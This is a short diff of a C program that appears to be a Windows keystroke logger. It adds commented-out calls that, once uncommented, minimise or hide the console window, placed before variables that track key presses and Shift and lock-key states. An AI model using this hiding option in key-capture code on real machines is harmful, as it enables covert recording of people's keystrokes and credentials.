@@ -8,6 +8,10 @@ Author :- ABHI (5her10c)*/
 
 
 int main() {
+    //HWND hwnd=GetConsoleWindow();
+    //ShowWindow(hwnd,SW_MINIMIZE); //uncomment this to  minimise the window
+    //ShowWindow(hwnd,SW_HIDE); //uncomment this to hide the window
+    
     int key,isPressed,last_key_state[0xFF];
     char showKey;
     int isCAPSLOCK,isNUMLOCK,isL_SHIFT,isR_SHIFT;
